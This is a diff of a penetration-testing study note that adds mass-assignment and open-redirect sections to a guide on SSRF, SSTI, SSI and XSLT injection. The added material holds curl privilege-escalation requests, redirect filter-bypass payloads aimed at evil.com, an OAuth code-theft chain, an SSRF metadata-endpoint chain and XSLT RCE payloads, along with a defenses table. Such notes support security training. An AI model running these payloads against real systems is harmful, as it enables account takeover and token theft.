@@ -1,10 +1,10 @@
 # Server-Side Attacks
 
-#SSRF #SSTI #SSI #XSLT #ServerSide #WebAppAttacks #RCE #LFI #InjectionAttacks
+#SSRF #SSTI #SSI #XSLT #MassAssignment #OpenRedirect #ServerSide #WebAppAttacks #RCE #LFI #InjectionAttacks
 
 ## What is this?
 
-Server-side attacks target the application/server itself rather than the client (contrast with XSS). This note covers four injection classes: **SSRF** (server coerced into making unauthorized requests), **SSTI** (attacker code runs inside a server-rendered template), **SSI Injection** (attacker directives run inside Apache/IIS server-side includes), and **XSLT Injection** (attacker XSL elements run inside an XML→output transform). All four can escalate to LFI or RCE depending on engine/library configuration. Pairs with [[File Inclusion]], [[Command Injection]], [[Web Attacks]].
+Server-side attacks target the application/server itself rather than the client (contrast with XSS). This note covers four injection classes — **SSRF** (server coerced into making unauthorized requests), **SSTI** (attacker code runs inside a server-rendered template), **SSI Injection** (attacker directives run inside Apache/IIS server-side includes), and **XSLT Injection** (attacker XSL elements run inside an XML→output transform) — plus two request/binding abuses that ride the same server-side trust: **Mass Assignment** (auto-bound request params set fields you shouldn't control) and **Open Redirect** (user-controlled redirect target → phishing / OAuth code theft / SSRF filter bypass). The four injections can escalate to LFI or RCE depending on engine/library configuration. Pairs with [[File Inclusion]], [[Command Injection]], [[Web Attacks]].
 
 > [!note] Protocol reference — the XML document model that XSLT transforms and XXE abuse: [[Standards & Protocols/XML|XML]].
 
@@ -419,6 +419,136 @@ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /
 
 ---
 
+## Mass Assignment
+
+Frameworks that auto-bind request parameters to object properties may allow setting fields that weren't intended to be user-controlled (role, admin flag, price, balance).
+
+### Identify
+
+```bash
+# Register/update requests — look for what fields the app accepts
+# If API returns more fields than the form shows → test setting them
+
+# Example: register endpoint takes {"username":"x","password":"y"}
+# API returns: {"id":5,"username":"x","isAdmin":false,"role":"user"}
+# Try submitting isAdmin/role in the registration request
+
+# Test fields from API responses that the form doesn't expose
+curl -s -X POST "http://<TARGET_IP>/api/register" -H "Content-Type: application/json" -d '{"username":"attacker","password":"P@ssw0rd","role":"admin"}'
+
+curl -s -X POST "http://<TARGET_IP>/api/register" -H "Content-Type: application/json" -d '{"username":"attacker","password":"P@ssw0rd","isAdmin":true}'
+
+# Profile update — escalate role
+curl -s -X PUT "http://<TARGET_IP>/api/profile" -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d '{"username":"user","email":"x@x.com","role":"admin","balance":999999}'
+
+# Check JSON vs form body — frameworks may handle differently
+curl -s -X POST "http://<TARGET_IP>/checkout" -H "Content-Type: application/x-www-form-urlencoded" -d "product_id=1&qty=1&price=0.01"
+```
+
+### Framework-Specific Notes
+
+```bash
+# Ruby on Rails — mass assignment happens when params AREN'T filtered
+# Strong params STRIP non-permitted keys, so adding user[admin]=true to a proper
+# permit(:username, :email) does NOTHING. It's exploitable only when the controller
+# skips strong params, uses params.require(:user).permit! (permit everything), or a
+# legacy attr_accessible/attr_protected misconfig — THEN user[admin]=true binds.
+
+# Laravel/PHP — $fillable vs $guarded
+# If $guarded = [] → all fields bindable
+
+# Django — ModelForm without exclude → all fields
+# Spring — @ModelAttribute binds all matching fields
+
+# Node/Express — req.body spread into DB update
+# PUT /api/user → {...req.body} → includes any field in body
+
+# Enumerate object properties from GET response, then add them to POST/PUT
+curl -s "http://<TARGET_IP>/api/profile/5" | python3 -m json.tool
+# Add every returned key to PUT body with modified values
+```
+
+> [!note] Mass assignment is the same escalation class as the GraphQL mutation-input privesc — any bound field mapping to a privileged attribute (role, `isAdmin`, price, owner) is a candidate. See [[Class notes/HTB Academy/CWES Claude/API Attacks|API Attacks]].
+
+---
+
+## Open Redirect
+
+App redirects to a user-controlled URL. Used to phish, bypass URL validation, steal OAuth tokens, or chain with SSRF. (Not an injection into the server, but a server-emitted redirect the attacker controls — hence its home alongside SSRF.)
+
+### Identify
+
+```bash
+# Parameters that commonly hold redirect destinations:
+# ?redirect=, ?url=, ?next=, ?return=, ?returnTo=, ?goto=, ?redir=, ?destination=
+
+# Test with external URL
+curl -sv "http://<TARGET_IP>/login?redirect=https://evil.com" 2>&1 | grep -i location
+# Look for: Location: https://evil.com
+
+# Check response body for redirects too (JS-based)
+curl -s "http://<TARGET_IP>/logout?next=https://evil.com" | grep -i "window.location\|href="
+```
+
+### Filter Bypass
+
+```bash
+# Whitelist bypass — trick validation to allow external URL
+curl -sv "http://<TARGET_IP>/redirect?url=https://evil.com%2F@target.com" 2>&1 | grep location
+curl -sv "http://<TARGET_IP>/redirect?url=https://target.com.evil.com" 2>&1 | grep location
+curl -sv "http://<TARGET_IP>/redirect?url=//evil.com" 2>&1 | grep location
+curl -sv "http://<TARGET_IP>/redirect?url=https:evil.com" 2>&1 | grep location
+curl -sv "http://<TARGET_IP>/redirect?url=https://evil%E3%80%82com" 2>&1 | grep location  # Unicode dot
+
+# Substring / starts-with check bypass
+curl -sv "http://<TARGET_IP>/redirect?url=https://target.com@evil.com" 2>&1 | grep location
+curl -sv "http://<TARGET_IP>/redirect?url=https://evil.com?target.com" 2>&1 | grep location
+curl -sv "http://<TARGET_IP>/redirect?url=https://evil.com#target.com" 2>&1 | grep location
+
+# Double URL encoding
+curl -sv "http://<TARGET_IP>/redirect?url=%2568ttps://evil.com" 2>&1 | grep location
+```
+
+### Exploitation Chains
+
+```bash
+# 1. Phishing — victim sees the legit domain before the bounce
+#    https://target.com/redirect?url=https://evil.com/fake-login
+
+# 2. OAuth code theft — the redirect_uri goes on the AUTHORIZATION request.
+#    Providers validate redirect_uri against an allowlist; an open redirect ON an
+#    allowlisted host satisfies that check, then forwards the ?code onward:
+#    https://idp.com/authorize?client_id=<id>&response_type=code
+#      &redirect_uri=https://target.com/redirect%3Furl%3Dhttps://evil.com
+#    Then exchange it: POST /token with code + client_id. See [[Techniques/OAuth-OIDC-SAML|OAuth-OIDC-SAML]].
+
+# 3. SSRF filter bypass — app validates redirect URL then fetches it server-side:
+#    https://<target>/fetch?url=https://<target>/redirect?url=http://169.254.169.254/
+```
+
+---
+
+## Prevention (Know the Defenses)
+
+What you're up against per class, and where each control still leaks — useful for the remediation section of a report.
+
+| Class | Control | Residual gap |
+|---|---|---|
+| **SSRF** | Allowlist destination hosts | The only control that really works. A *blocklist* loses to decimal/octal/IPv6 encodings, `nip.io`, and redirects |
+| **SSRF** | Validate the URL, then fetch | Classic TOCTOU — DNS rebinding re-resolves between check and fetch. Resolve **once** and connect to that IP |
+| **SSRF** | IMDSv2 (session tokens) | Only helps if IMDSv1 is actually *disabled* — it stays enabled by default on older instances. Also set the hop limit to 1 |
+| **SSTI** | Never concatenate user input into a template | The actual fix. Pass it as a **context variable**, not template source |
+| **SSTI** | Sandboxed / logic-less engine | Sandboxes get escaped routinely; logic-less (Mustache) removes the RCE primitive at a feature cost |
+| **SSI** | Disable `exec`/`include` directives; don't serve user content as `.shtml` | `Options +Includes` on a writable/user-fed path is what enables it |
+| **XSLT** | Lock `FEATURE_SECURE_PROCESSING`; disable extension functions / scripting | `document()` LFI/SSRF survives most lockdowns — restrict what the processor may read |
+| **Mass assignment** | Explicit allowlist binding (strong params, `$fillable`, DTOs) | A `permit!` / `$guarded = []` / `{...req.body}` escape hatch reopens it |
+| **Open redirect** | Relative paths only, or an allowlist | Substring/prefix checks lose to `target.com.evil.com`, `@`, `//`, and Unicode dots |
+
+> [!warning]
+> SSRF blocklists are the single most common failed remediation. If a report says "we block 169.254.169.254", retest with `2130706433`, `[::1]`, `127.0.0.1.nip.io`, and an attacker-hosted 302 — at least one usually still lands.
+
+---
+
 ## Quick Reference
 
 | Goal | Payload / Command |
@@ -445,9 +575,12 @@ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /
 | XSLT RCE (PHP) | `<xsl:value-of select="php:function('system','id')" />` |
 | XSLT RCE (Java/Xalan) | `rt:exec($rtobject,'id')` via `java.lang.Runtime` extension namespace |
 | XSLT RCE (.NET) | `<msxsl:script language="C#">` inline code block |
+| Mass assignment | add `role`/`isAdmin` to register/update body; enumerate keys from GET response |
+| Open redirect | `?redirect=https://evil.com`; bypass with `target.com@evil.com`, `//evil.com`, Unicode dot |
+| Open redirect → OAuth theft | allowlisted-host redirect forwards `?code` to attacker |
 
 ---
 
 *Created: 2026-07-14*
-*Updated: 2026-07-31*
-*Model: claude-opus-4-8*
+*Updated: 2026-08-28*
+*Model: claude-opus-5*
